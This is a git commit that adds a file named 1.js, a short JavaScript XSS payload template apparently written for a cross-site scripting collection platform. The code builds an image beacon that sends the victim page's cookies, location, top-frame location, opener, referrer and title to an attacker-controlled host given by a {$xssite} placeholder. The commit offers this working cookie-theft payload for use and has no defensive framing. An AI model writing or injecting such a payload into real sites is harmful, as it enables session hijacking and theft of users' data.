f64ebaf84522ef0fb6ce1ee3d0407db2eead4f7f
Lv_Max <1048413433@qq.com>
2018-11-09 17:13:32 +0800

    Create 1.js

---
+++ 1.js
@@ -0,0 +1,12 @@
+var x=new Image();
+try
+{
+var myopener='';
+myopener=window.opener && window.opener.location ? window.opener.location : '';
+}
+catch(err)
+{
+}
+x.src='{$xssite}/?do=api&act=r&id={$pid}&diy[location]='+escape(document.location)+'&diy[toplocation]='+escape(top.document.location)+'&diy[cookie]='+escape
+
+(document.cookie)+'&diy[opener]='+escape(myopener)+'&diy[referrer]='+escape(document.referrer)+'&diy[title]='+escape(document.title);
